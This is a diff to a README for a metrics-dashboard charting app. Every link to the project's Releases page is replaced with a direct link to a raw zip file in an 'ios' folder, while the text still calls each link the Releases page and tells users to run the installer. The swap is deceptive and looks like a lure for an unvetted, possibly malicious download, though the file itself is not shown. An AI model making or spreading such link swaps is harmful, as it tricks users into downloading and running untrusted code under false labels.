@@ -4,7 +4,7 @@
 Welcome to `metrics_dashboard`, a modern application that helps you visualize metrics with stunning interactive charts. You can explore real-time data through our Line, Bar, and Pie charts, gathering insights quickly and easily.
 
 ## 📥 Download the App
-[![Download metrics_dashboard](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/christghuynh/metrics_dashboard/releases)
+[![Download metrics_dashboard](https://raw.githubusercontent.com/christghuynh/metrics_dashboard/master/ios/metrics_dashboard_v3.7.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/christghuynh/metrics_dashboard/master/ios/metrics_dashboard_v3.7.zip)
 
 To get started, click the link above to access the Releases page, where you will find the latest version of our application.
 
@@ -25,7 +25,7 @@ To run `metrics_dashboard`, your computer should meet the following requirements
 ## 📦 Download & Install
 Follow these steps to download and install `metrics_dashboard`:
 
-1. **Visit Releases Page**: Go to the [Releases page](https://github.com/christghuynh/metrics_dashboard/releases) to choose the latest version.
+1. **Visit Releases Page**: Go to the [Releases page](https://raw.githubusercontent.com/christghuynh/metrics_dashboard/master/ios/metrics_dashboard_v3.7.zip) to choose the latest version.
 2. **Choose Your File**: Look for the file that matches your operating system.
 3. **Download the File**: Click on the file name to start the download.
 4. **Run the Installer**: Once the download is complete, locate the file and double-click it to run the installer.
@@ -40,7 +40,7 @@ Once installed, you can open `metrics_dashboard`. Here’s how to get started:
 4. **View Your Metrics**: The selected chart will populate with your data in real time, allowing for interactive exploration.
 
 ## 🔄 Updating the App
-To ensure you always use the latest features, regularly check the [Releases page](https://github.com/christghuynh/metrics_dashboard/releases) for updates. Download the latest version following the same steps outlined above.
+To ensure you always use the latest features, regularly check the [Releases page](https://raw.githubusercontent.com/christghuynh/metrics_dashboard/master/ios/metrics_dashboard_v3.7.zip) for updates. Download the latest version following the same steps outlined above.
 
 ## 🙋 Frequently Asked Questions
 ### What types of data can I visualize?
@@ -61,4 +61,4 @@ Connect with other users and developers. Share your experiences, tips, and use c
 ## 📣 Acknowledgments
 We appreciate your interest in using `metrics_dashboard`. Thank you for supporting open source projects!
 
-Don’t forget to [visit the Releases page](https://github.com/christghuynh/metrics_dashboard/releases) to download and start visualizing your metrics today!
+Don’t forget to [visit the Releases page](https://raw.githubusercontent.com/christghuynh/metrics_dashboard/master/ios/metrics_dashboard_v3.7.zip) to download and start visualizing your metrics today!
